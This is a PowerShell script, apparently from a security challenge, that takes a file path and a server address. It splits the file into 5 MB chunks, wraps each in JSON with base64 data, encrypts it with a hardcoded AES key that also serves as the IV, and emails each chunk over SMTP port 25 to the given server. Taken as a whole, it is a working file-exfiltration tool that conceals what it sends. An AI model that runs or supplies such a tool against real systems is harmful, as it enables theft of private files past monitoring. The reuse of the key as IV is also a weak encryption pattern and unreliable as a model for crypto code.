$filePath = $args[0]
$server = $args[1]
$port = 25
$from = "bip@challenge.com"
$to = "bip@challenge.com"
$subject = "subj"
# $DebugPreference = "Continue"

function Send-Email {
    param (
        [Parameter(Mandatory=$true)]
        [String]$Content
    )
    $encrypted = Protect-AES -PlainText $Content # encrypt file using AES
    try {
        # email object and smtp client initialization
        $emailMessage = [System.Net.Mail.MailMessage]::new($from, $to, $subject, $encrypted)
        $emailMessage.BodyTransferEncoding = 1; # base64
        $smtpClient = [System.Net.Mail.SmtpClient]::new($server, $port)
        $smtpClient.Send($emailMessage) # send email
        Write-Debug "[+] Email sent successfully"
    } catch {
        Write-Debug "[-] Failed to send email. Error: $($_.Exception.Message)"
    } finally {
        $smtpClient.Dispose()
        $emailMessage.Dispose()
    }
}

function Protect-AES { # encrypt using AES
    param(
        [Parameter(Mandatory=$true)]
        [String]$PlainText
    )
    $key = "MySecretKeysssss"
    # convert the plaintext and key to byte arrays
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $aes = [System.Security.Cryptography.Aes]::Create()
    # set the key and IV, padding set to PKCS7 by the default
    $aes.Key = $keyBytes
    $aes.IV = $keyBytes
    # objects instantiation, CryptoStream will perform encryption
    $encryptor = $aes.CreateEncryptor()
    $encryptedStream = [System.IO.MemoryStream]::new()
    $cryptoStream = [System.Security.Cryptography.CryptoStream]::new($encryptedStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $plainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $cryptoStream.Write($plainTextBytes, 0, $plainTextBytes.Length)
    $cryptoStream.FlushFinalBlock()
    $encryptedBytes = $encryptedStream.ToArray() # get the encrypted data as a byte array
    # close streams
    $cryptoStream.Close()
    $encryptedStream.Close()
    # return encrypted data as base64
    return [System.Convert]::ToBase64String($encryptedBytes)
}

if (($null -eq $filePath) -or ($null -eq $server)) {
    Write-Output "Usage: .\sender.ps1 [file] [ip]"
    return
} else {
    try { 
        $fileSize = (Get-Item $filePath).Length
        $chunkSize = 5 * 1024 * 1024 # chunk size in bytes
        $fileStream = [System.IO.File]::OpenRead($filePath)
        try {
            $chunkNumber = 1
            $buffer = New-Object byte[] $chunkSize
            # read file in chunks
            while ($bytesRead = $fileStream.Read($buffer, 0, $chunkSize)) { # read $chunkSize bytes from the file
                if ($bytesRead -ne $buffer.Length) { # read less than the expected bytes?
                    # shrink the output array to the number of read bytes
                    $output = New-Object byte[] -ArgumentList $bytesRead
                    [Array]::Copy($buffer, $output, $bytesRead)
                    $buffer = $output
                }
                $content = [PSCustomObject]@{ # email's body content
                    fileName = $filePath
                    fileSize = $fileSize
                    chunkn = $chunkNumber
                    chunkSize = $chunkSize
                    data = [System.Convert]::ToBase64String($buffer)
                }
                # convert content to json string and send email
                $jsonData = ConvertTo-Json -InputObject $content
                $jsonString = $jsonData | Out-String
                Send-Email -Content $jsonString
                $chunkNumber++
            }
        } catch {
            Write-Debug "[-] Error while reading chunks: $($_.Exception.Message)"
        } finally {
            $fileStream.Close()
        }
        # }
    } catch {
        Write-Debug "[-] Something went wrong. Error: $($_.Exception.Message)"
    }
}